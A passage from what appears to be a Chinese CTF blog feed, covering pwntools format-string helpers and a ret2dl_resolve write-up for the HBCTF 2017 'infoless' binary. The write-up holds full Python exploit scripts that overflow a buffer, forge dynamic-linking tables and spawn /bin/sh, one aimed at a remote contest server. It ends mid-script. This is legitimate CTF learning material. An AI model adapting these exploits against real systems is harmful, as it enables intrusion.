<p>主要就是一个类，一个函数：<br><code>class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0)</code><br><code>pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;) → str</code></p>
<p>其中上面的那个类可以用来完成fsb的所有操作，下面那个方法主要是用来产生payload用。</p>
<ul>
<li>execute_fmt 一个存在fsb的process，我们通过这个process的交互过程来得到fsb的一些基本信息</li>
<li>offset 偏移，没有给出的话会通过栈泄露自动给出</li>
<li>padlen payload之前填充的字符数</li>
<li>numbwritem 生成的此payload（包括填充）之前的偏移量</li>
</ul>
<p>看了看源码，发现<code>成员名</code>和<code>参数名</code>是同名的，直接调用即可。我们其实可以主要用这个来得到<code>FmtStr.offset</code>即可。<br>实例化一个类后，通过<code>write(addr, data)</code>来控制想要修改的地址和数据，可以通过一个字典来传参<strong>（data(int)）</strong>。<br>最后通过<code>execute_writes()</code>方法来调用<code>fmtstr_payload</code>生成payload并发送出去。</p>
<p>我们也可以直接调用<code>fmtstr_payload(offset, writes, numbwritten=0, write_size=&#39;byte&#39;)</code>这个方法来只生成payload。<br>给下参数，没啥特别的</p>
<ul>
<li>offset (int) – the first formatter’s offset you control</li>
<li>writes (dict) – dict with addr, value {addr: value, addr2: value2}</li>
<li>numbwritten (int) – number of byte already written by the printf function</li>
<li>write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;神tm的，我写了两个半小时的文章啊，就这么没了。就在我随手把浏览器关掉的时候意识到，“等等，我好像忘了什么东西”，果然。。没有断电保存功能的
    
    </summary>
    
    
      <category term="PWN" scheme="http://reehy.top/tags/PWN/"/>
    
      <category term="FILE" scheme="http://reehy.top/tags/FILE/"/>
    
  </entry>
  
  <entry>
    <title>瓜皮的日常吐槽</title>
    <link href="http://reehy.top/2017/04/13/%E7%93%9C%E7%9A%AE%E7%9A%84%E6%97%A5%E5%B8%B8%E5%90%90%E6%A7%BD/"/>
    <id>http://reehy.top/2017/04/13/瓜皮的日常吐槽/</id>
    <published>2017-04-13T02:13:06.000Z</published>
    <updated>2017-04-13T02:21:48.309Z</updated>
    
    <content type="html"><![CDATA[<p>诶诶诶，我说。我的运维怎么这么烂啊，自己的博客和服务器用用也不知道是哪里的内存泄漏了，开机35%，跑个几星期就70%。。。随便一看还能发现一堆zombia process，杀都杀不死，必须得重启。。。hexo的启动慢的要死，要等个好几秒。。</p>
<p>还有那个老博客，我都不敢看，惨不忍睹，就跑了个wordpress啊。</p>
<p>奥还跑了个shadowsocks的server。。</p>
<p>啥时候把那个博客关了，换个专门的shadowsocks，还能租出去，省得每个月吃我口粮钱v(｡･ω･｡)</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;诶诶诶，我说。我的运维怎么这么烂啊，自己的博客和服务器用用也不知道是哪里的内存泄漏了，开机35%，跑个几星期就70%。。。随便一看还能发现一堆zombia process，杀都杀不死，必须得重启。。。hexo的启动慢的要死，要等个好几秒。。&lt;/p&gt;
&lt;p&gt;还有那个老博客，我
    
    </summary>
    
    
      <category term="life" scheme="http://reehy.top/tags/life/"/>
    
  </entry>
  
  <entry>
    <title>ret_2_dl_resolve</title>
    <link href="http://reehy.top/2017/04/12/ret-2-dl-resolve/"/>
    <id>http://reehy.top/2017/04/12/ret-2-dl-resolve/</id>
    <published>2017-04-12T07:12:06.000Z</published>
    <updated>2017-04-13T02:03:34.326Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在学pwn里的沙盒的时候接触到了这个技术，瞬间会想起以前的很多题目原来是可以这样做的。技术原理很简单，理解了linux里的lazy binding就不难理解。</p>
<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><blockquote>
<ul>
<li>控制EIP为PLT[0]的地址，只需传递一个index_arg参数</li>
<li>控制index_arg的大小，使reloc的位置落在可控地址内</li>
<li>伪造reloc的内容，使sym落在可控地址内</li>
<li>伪造sym的内容，使name落在可控地址内</li>
<li>伪造name为任意库函数，如system</li>
</ul>
</blockquote>
<p>所以我们得出结论，我们最终要伪造三个节信息，分别是<code>.rel.plt</code>, <code>.dynsym</code>, <code>.dynstr</code>，并且在<code>dynstr</code>上布置我们希望调用的函数的<code>str</code>，比如<code>system</code>。并且我们要通过控制<code>index_args</code>参数和<code>eip</code>指针是的程序按照我们的设计来调用函数。</p>
<h2 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h2><p>以2017hbctf第一场的pwn200来分析</p>
<p>程序逻辑<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">int __cdecl main()</div><div class="line">&#123;</div><div class="line">  setvbuf(stdin, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  setvbuf(stderr, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</div><div class="line">  read_buf();</div><div class="line">  fflush(stdout);</div><div class="line">  return <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<figure class="highlight aspectj"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function">ssize_t <span class="title">read_buf</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">char</span> buf; <span class="comment">// [sp+6h] [bp-12h]@1</span></div><div class="line"></div><div class="line">  <span class="function"><span class="keyword">return</span> <span class="title">read</span><span class="params">(<span class="number">0</span>, &amp;buf, <span class="number">0x3C</span>u)</span></span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>checksec<br><figure class="highlight yaml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">root@kali ~/c/<span class="number">2</span>/p/infoless<span class="comment"># checksec infoless </span></div><div class="line">[*] <span class="string">'/root/ctf-problem/2017hbctf/pwn/infoless/infoless'</span></div><div class="line"><span class="attr">    Arch:</span>     i386<span class="bullet">-32</span>-little</div><div class="line"><span class="attr">    RELRO:</span>    <span class="literal">No</span> RELRO</div><div class="line"><span class="attr">    Stack:</span>    <span class="literal">No</span> canary found</div><div class="line"><span class="attr">    NX:</span>       NX enabled</div><div class="line"><span class="attr">    PIE:</span>      <span class="literal">No</span> PIE (<span class="number">0x8048000</span>)</div></pre></td></tr></table></figure></p>
<p>除此之外就没有信息了，所以这题考察的就是如何在缺少信息的情况下getshell，这里用到的一种技术就是ret_2_dl_resolve。</p>
<p>关于<code>.dynamic</code>：<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">root</span>@<span class="selector-tag">kali</span> ~/<span class="selector-tag">c</span>/<span class="selector-tag">2</span>/<span class="selector-tag">p</span>/<span class="selector-tag">infoless</span># <span class="selector-tag">readelf</span> <span class="selector-tag">-d</span> <span class="selector-tag">infoless</span> </div><div class="line"></div><div class="line"><span class="selector-tag">Dynamic</span> <span class="selector-tag">section</span> <span class="selector-tag">at</span> <span class="selector-tag">offset</span> <span class="selector-tag">0x70c</span> <span class="selector-tag">contains</span> <span class="selector-tag">24</span> <span class="selector-tag">entries</span>:</div><div class="line">  标记        类型                         名称/值</div><div class="line"> <span class="selector-tag">0x00000001</span> (NEEDED)                     共享库：<span class="selector-attr">[libc.so.6]</span></div><div class="line"> <span class="selector-tag">0x0000000c</span> (INIT)                       <span class="selector-tag">0x8048340</span></div><div class="line"> <span class="selector-tag">0x0000000d</span> (FINI)                       <span class="selector-tag">0x80485c4</span></div><div class="line"> <span class="selector-tag">0x00000019</span> (INIT_ARRAY)                 <span class="selector-tag">0x8049700</span></div><div class="line"> <span class="selector-tag">0x0000001b</span> (INIT_ARRAYSZ)               <span class="selector-tag">4</span> (bytes)</div><div class="line"> <span class="selector-tag">0x0000001a</span> (FINI_ARRAY)                 <span class="selector-tag">0x8049704</span></div><div class="line"> <span class="selector-tag">0x0000001c</span> (FINI_ARRAYSZ)               <span class="selector-tag">4</span> (bytes)</div><div class="line"> <span class="selector-tag">0x6ffffef5</span> (GNU_HASH)                   <span class="selector-tag">0x804818c</span></div><div class="line"> <span class="selector-tag">0x00000005</span> (STRTAB)                     <span class="selector-tag">0x804825c</span></div><div class="line"> <span class="selector-tag">0x00000006</span> (SYMTAB)                     <span class="selector-tag">0x80481bc</span></div><div class="line"> <span class="selector-tag">0x0000000a</span> (STRSZ)                      <span class="selector-tag">109</span> (bytes)</div><div class="line"> <span class="selector-tag">0x0000000b</span> (SYMENT)                     <span class="selector-tag">16</span> (bytes)</div><div class="line"> <span class="selector-tag">0x00000015</span> (DEBUG)                      <span class="selector-tag">0x0</span></div><div class="line"> <span class="selector-tag">0x00000003</span> (PLTGOT)                     <span class="selector-tag">0x80497f8</span></div><div class="line"> <span class="selector-tag">0x00000002</span> (PLTRELSZ)                   <span class="selector-tag">32</span> (bytes)</div><div class="line"> <span class="selector-tag">0x00000014</span> (PLTREL)                     <span class="selector-tag">REL</span></div><div class="line"> <span class="selector-tag">0x00000017</span> (JMPREL)                     <span class="selector-tag">0x8048320</span></div><div class="line"> <span class="selector-tag">0x00000011</span> (REL)                        <span class="selector-tag">0x8048300</span></div><div class="line"> <span class="selector-tag">0x00000012</span> (RELSZ)                      <span class="selector-tag">32</span> (bytes)</div><div class="line"> <span class="selector-tag">0x00000013</span> (RELENT)                     <span class="selector-tag">8</span> (bytes)</div><div class="line"> <span class="selector-tag">0x6ffffffe</span> (VERNEED)                    <span class="selector-tag">0x80482e0</span></div><div class="line"> <span class="selector-tag">0x6fffffff</span> (VERNEEDNUM)                 <span class="selector-tag">1</span></div><div class="line"> <span class="selector-tag">0x6ffffff0</span> (VERSYM)                     <span class="selector-tag">0x80482ca</span></div><div class="line"> <span class="selector-tag">0x00000000</span> (NULL)                       <span class="selector-tag">0x0</span></div></pre></td></tr></table></figure></p>
<p>ELF文件的.dynamic section里包含了ld.so用于运行时解析函数地址的信息。</p>
<p>通过半天多的努力终于算是理解掌握了ret_to_dl_resolve的利用方法。。正如如上所说，这里的关键点是理解linux的lazy binding的工作方式，由于要伪造三个节信息并且完全计算偏移，所以我认为不熟练的话还是需要花时间调试offset的。但是我看了别人的解法后发现了一个问题，那就是似乎<code>.dynamic</code>节似乎是可写的，那么我们似乎可以通过修改<code>.dynamic</code>的偏移信息使得直接定位<code>.dynstr</code>的地址到我们伪造的<code>.dynstr(bss)</code>上了。</p>
<p>参考exp:<br><figure class="highlight autoit"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#!/usr/bin/python</span></div><div class="line"><span class="meta"># -*- coding:utf-8 -*- </span></div><div class="line"> </div><div class="line">from pwn import *</div><div class="line">from time import *</div><div class="line"> </div><div class="line">vulFunAddr = <span class="number">0x080484CB</span></div><div class="line">readpltAddr = <span class="number">0x08048380</span></div><div class="line">fflushpltAddr = <span class="number">0x08048390</span></div><div class="line">dynstrInDynamicAddr = <span class="number">0x08049750</span></div><div class="line">bssAddr = <span class="number">0x08049820</span></div><div class="line"> </div><div class="line">strTable = [<span class="string">''</span>, <span class="string">'libc.so.6'</span>,<span class="string">'_IO_stdin_used'</span>, <span class="string">'fflush'</span>, <span class="string">'stdin'</span>, <span class="string">'read'</span>, <span class="string">'stdout'</span>, <span class="string">'stderr'</span>, <span class="string">'setvbuf'</span>,<span class="string">'__libc_start_main'</span>, <span class="string">'__gmon_start__'</span>, <span class="string">'GLIBC_2.0'</span>, <span class="string">''</span>]</div><div class="line">strTable[<span class="number">3</span>] = <span class="string">'system'</span></div><div class="line"><span class="meta">#将伪造的dynstr表中的fflush函数给换成system</span></div><div class="line">binShellStr = <span class="string">'/bin/sh\0'</span></div><div class="line">expOffset = <span class="number">22</span></div><div class="line">payloadHead = <span class="string">'a'</span>*expOffset</div><div class="line"> </div><div class="line">def writeStrTableToBSS(baseAddr):</div><div class="line">   tempBSS = baseAddr</div><div class="line">    <span class="meta">#循环写入伪造的dynstr表</span></div><div class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> strTable:</div><div class="line">       str = i + <span class="built_in">chr</span>(<span class="number">0</span>)</div><div class="line">       payloadTemp = payloadHead + p32(readpltAddr) + p32(vulFunAddr) + p32(<span class="number">0</span>)+ p32(tempBSS) + p32(len(str)+<span class="number">1</span>)</div><div class="line">       p.<span class="built_in">send</span>(payloadTemp)</div><div class="line">       <span class="built_in">sleep</span>(<span class="number">0.1</span>)</div><div class="line">       p.<span class="built_in">send</span>(str)</div><div class="line">       tempBSS = tempBSS + len(str)</div><div class="line">       <span class="built_in">sleep</span>(<span class="number">0.1</span>)</div><div class="line"> </div><div class="line">p = remote(<span class="string">'123.206.81.66'</span>, <span class="number">8888</span>)</div><div class="line"><span class="meta">#p = remote(<span class="string">'127.0.0.1'</span>, 8888)</span></div><div class="line"><span class="meta">#p = process(<span class="string">'./infoless'</span>)</span></div><div class="line">context.log_level = <span class="string">'debug'</span></div><div class="line"> </div><div class="line"><span class="meta">#step 1: 将binShStr写入可写的bss段中</span></div><div class="line">payload1 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(<span class="number">0</span>) + p32(bssAddr) + p32(<span class="number">8</span>)</div><div class="line">p.<span class="built_in">send</span>(payload1)</div><div class="line"><span class="built_in">sleep</span>(<span class="number">0.1</span>)</div><div class="line">p.<span class="built_in">send</span>(binShellStr)</div><div class="line"><span class="built_in">sleep</span>(<span class="number">0.1</span>)</div><div class="line"> </div><div class="line"><span class="meta">#step 2: 将伪造的dynstr表写入binShStr后面</span></div><div class="line">dynstrInBSSAddr = bssAddr +len(binShellStr) + <span class="number">4</span></div><div class="line">writeStrTableToBSS(dynstrInBSSAddr)</div><div class="line"> </div><div class="line"><span class="meta">#step 3: 将伪造的dynstr表地址写入dynamic中相对应的索引地址</span></div><div class="line">payload2 = payloadHead + p32(readpltAddr) +p32(vulFunAddr) + p32(<span class="number">0</span>) + p32(dynstrInDynamicAddr) + p32(<span class="number">4</span>)</div><div class="line">p.<span class="built_in">send</span>(payload2)</div><div class="line"><span class="built_in">sleep</span>(<span class="number">0.1</span>)</div><div class="line">p.<span class="built_in">send</span>(p32(dynstrInBSSAddr))</div><div class="line"><span class="built_in">sleep</span>(<span class="number">0.1</span>)</div><div class="line"> </div><div class="line"><span class="meta">#step 4：getshell</span></div><div class="line">payload3 = payloadHead + p32(fflushpltAddr)+ p32(vulFunAddr) + p32(bssAddr)</div><div class="line">p.<span class="built_in">send</span>(payload3)</div><div class="line"><span class="built_in">sleep</span>(<span class="number">0.1</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure></p>
<h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>于是我有了一个想法，既然<code>.dynamic</code>节是可写的，那么<code>.dynstr</code>节是否可写呢？其他的节是否还存在可写的呢，节是否可写是否有标志位给出呢？于是我进行了以下的测试。</p>
<h3 id="测试-dynstr节是否可写"><a href="#测试-dynstr节是否可写" class="headerlink" title="测试.dynstr节是否可写"></a>测试<code>.dynstr</code>节是否可写</h3><p>exp:<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line"><span class="built_in">local</span> = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="built_in">global</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</div><div class="line">    p = <span class="built_in">process</span>(<span class="string">'./infoless'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote()</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span> <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, <span class="built_in">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line"><span class="built_in">offset</span> = <span class="number">22</span></div><div class="line">elf = ELF(<span class="string">'./infoless'</span>)</div><div class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</div><div class="line">vuln_addr = <span class="number">0x80484CB</span></div><div class="line">bss_addr = <span class="number">0x8049820</span></div><div class="line">fflush_plt = elf.symbols[<span class="string">'fflush'</span>]</div><div class="line"></div><div class="line">def pwn():</div><div class="line"></div><div class="line">    addr = bss_addr</div><div class="line">    payload1 = <span class="built_in">offset</span> * <span class="string">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">100</span>)</div><div class="line">    p.sendline(payload1)</div><div class="line">    payload2 = <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">20</span>, <span class="string">'a'</span>)</div><div class="line">    p.sendline(payload2)</div><div class="line"></div><div class="line">    addr = <span class="number">0x8048276</span></div><div class="line">    gdb,attach(p)</div><div class="line">    payload1 = <span class="built_in">offset</span> * <span class="string">'b'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(addr) + p32(<span class="number">100</span>)</div><div class="line">    p.sendline(payload1)</div><div class="line">    payload2 = <span class="string">'system\x00'</span></div><div class="line">    p.sendline(payload2)</div><div class="line"></div><div class="line">    payload1 = <span class="number">14</span> * <span class="string">'c'</span> + p32(fflush_plt) + p32(<span class="number">0</span>) + p32(bss_addr)</div><div class="line">    p.sendline(payload1)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    pwn()</div><div class="line">    p.interactive()</div></pre></td></tr></table></figure></p>
<p>嗯，测试结果不可写= =，但是当我们尝试去写的时候似乎不会报错？（应该是有一个address fault的呀- -）。</p>
<h3 id="节的权限"><a href="#节的权限" class="headerlink" title="节的权限"></a>节的权限</h3><p>通过gdb的vmmap可以得到权限。当ELF文件被加载到内存中后，系统会将多个具有相同权限Section(节)合并成一个Segment(段)，通常为代码段(可读可执行)，可读可写的数据段，和只读数据段。</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">wndbg&gt; vmmap </div><div class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</div><div class="line"> <span class="number">0x8048000</span>  <span class="number">0x8049000</span> r-xp     <span class="number">1000</span> <span class="number">0</span>      /root/ctf-problem/2017hbctf/pwn/infoless/infoless</div><div class="line"> <span class="number">0x8049000</span>  <span class="number">0x804a000</span> rw-p     <span class="number">1000</span> <span class="number">0</span>      /root/ctf-problem/2017hbctf/pwn/infoless/infoless</div><div class="line"><span class="number">0xf7dfa000</span> <span class="number">0xf7dfc000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </div><div class="line"><span class="number">0xf7dfc000</span> <span class="number">0xf7fad000</span> r-xp   <span class="number">1b1000</span> <span class="number">0</span>      /lib32/libc-<span class="number">2.24</span>.so</div><div class="line"><span class="number">0xf7fad000</span> <span class="number">0xf7faf000</span> r--p     <span class="number">2000</span> <span class="number">1b0000</span> /lib32/libc-<span class="number">2.24</span>.so</div><div class="line"><span class="number">0xf7faf000</span> <span class="number">0xf7fb0000</span> rw-p     <span class="number">1000</span> <span class="number">1b2000</span> /lib32/libc-<span class="number">2.24</span>.so</div><div class="line"><span class="number">0xf7fb0000</span> <span class="number">0xf7fb3000</span> rw-p     <span class="number">3000</span> <span class="number">0</span>      </div><div class="line"><span class="number">0xf7fd2000</span> <span class="number">0xf7fd4000</span> rw-p     <span class="number">2000</span> <span class="number">0</span>      </div><div class="line"><span class="number">0xf7fd4000</span> <span class="number">0xf7fd7000</span> r--p     <span class="number">3000</span> <span class="number">0</span>      [vvar]</div><div class="line"><span class="number">0xf7fd7000</span> <span class="number">0xf7fd9000</span> r-xp     <span class="number">2000</span> <span class="number">0</span>      [vdso]</div><div class="line"><span class="number">0xf7fd9000</span> <span class="number">0xf7ffb000</span> r-xp    <span class="number">22000</span> <span class="number">0</span>      /lib32/ld-<span class="number">2.24</span>.so</div><div class="line"><span class="number">0xf7ffc000</span> <span class="number">0xf7ffd000</span> r--p     <span class="number">1000</span> <span class="number">22000</span>  /lib32/ld-<span class="number">2.24</span>.so</div><div class="line"><span class="number">0xf7ffd000</span> <span class="number">0xf7ffe000</span> rw-p     <span class="number">1000</span> <span class="number">23000</span>  /lib32/ld-<span class="number">2.24</span>.so</div><div class="line"><span class="number">0xfffdd000</span> <span class="number">0xffffe000</span> rw-p    <span class="number">21000</span> <span class="number">0</span>      [stack]</div></pre></td></tr></table></figure>
<h3 id="关于传参"><a href="#关于传参" class="headerlink" title="关于传参"></a>关于传参</h3><p>我的一个失败的exp：<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># coding=utf-8</span></div><div class="line"><span class="built_in">from</span> pwn import *</div><div class="line"></div><div class="line">slog = <span class="number">1</span></div><div class="line"><span class="built_in">local</span> = <span class="number">1</span></div><div class="line">debug = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="built_in">global</span> p</div><div class="line"></div><div class="line"><span class="keyword">if</span> slog: context(log_level = <span class="string">'debug'</span>)</div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</div><div class="line">    p = <span class="built_in">process</span>(<span class="string">'./infoless'</span>)</div><div class="line"><span class="keyword">else</span>:</div><div class="line">    p = remote()</div><div class="line"></div><div class="line"><span class="keyword">if</span> <span class="built_in">local</span> <span class="keyword">and</span> debug:</div><div class="line">    gdb.attach(p, <span class="built_in">open</span>(<span class="string">'debug'</span>))</div><div class="line"></div><div class="line"></div><div class="line">elf = ELF(<span class="string">'./infoless'</span>)</div><div class="line"></div><div class="line"><span class="built_in">offset</span> = <span class="number">22</span></div><div class="line"><span class="comment"># .rel.plt  reloc = reloc + .rel.plt , fake reloc_args to locate reloc on bss</span></div><div class="line"></div><div class="line"><span class="comment"># .dynsym   sym = .dynsym + reloc-&gt;info , fake reloc-&gt;info to locate sym on bss</span></div><div class="line"></div><div class="line"><span class="comment"># .dynstr   name = .dynstr + sym-&gt;value, fake sym-&gt;value to locate name on bss</span></div><div class="line"></div><div class="line"><span class="comment">#  name_str fake name_str on bss</span></div><div class="line"></div><div class="line">pr = <span class="number">0x08048361</span></div><div class="line">relplt_addr = <span class="number">0x8048320</span></div><div class="line">vuln_addr = <span class="number">0x80484CB</span></div><div class="line">plt_addr = <span class="number">0x8048370</span></div><div class="line">bss_addr = <span class="number">0x8049820</span></div><div class="line">dynsym_addr = <span class="number">0x80481bc</span></div><div class="line">dynstr_addr = <span class="number">0x0804825c</span></div><div class="line">read_plt = elf.symbols[<span class="string">'read'</span>]</div><div class="line"></div><div class="line">def pwn():</div><div class="line">    print <span class="string">'bss_addr =&gt; '</span>, hex(bss_addr)</div><div class="line"></div><div class="line">    <span class="comment"># send /bin/sh</span></div><div class="line">    addr = bss_addr</div><div class="line">    payload1 = <span class="built_in">offset</span> * <span class="string">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(bss_addr) + p32(<span class="number">100</span>)</div><div class="line">    p.sendline(payload1)</div><div class="line">    payload2 = <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">20</span>, <span class="string">'a'</span>)</div><div class="line">    p.sendline(payload2)</div><div class="line">    </div><div class="line">    <span class="comment"># fake .rel.plt on bss</span></div><div class="line">    <span class="comment"># 0x0804970c      0x00000107</span></div><div class="line">    addr += <span class="built_in">len</span>(payload2)</div><div class="line">    payload1 = <span class="built_in">offset</span> * <span class="string">'a'</span> + p32(read_plt) + p32(vuln_addr) + p32(<span class="number">0</span>) + p32(addr) + p32(<span class="number">100</span>)</div><div class="line"><span class="comment">#    gdb.attach(p, open('debug'))</span></div><div class="line">    p.sendline(payload1)</div><div class="line">    print <span class="string">'addr - relplt_addr =&gt; '</span>, hex(addr - relplt_addr)</div><div class="line">    off = ((addr - dynsym_addr) / <span class="number">0x10</span> + <span class="number">1</span>) * <span class="number">0x100</span> + <span class="number">0x7</span></div><div class="line">    print <span class="string">'off =&gt; '</span>, hex(off)</div><div class="line">    payload2 = p32(elf.got[<span class="string">'fflush'</span>]) + p32(off)</div><div class="line">    p.sendline(payload2)</div><div class="line"><span class="comment">#    gdb.attach(p)</span></div><div class="line"></div><div class="line">    <span class="comment"># fake .dynsym on bss</span></div><div class="line">    <span class="comment"># 0x0000001a      0x00000000      0x00000000      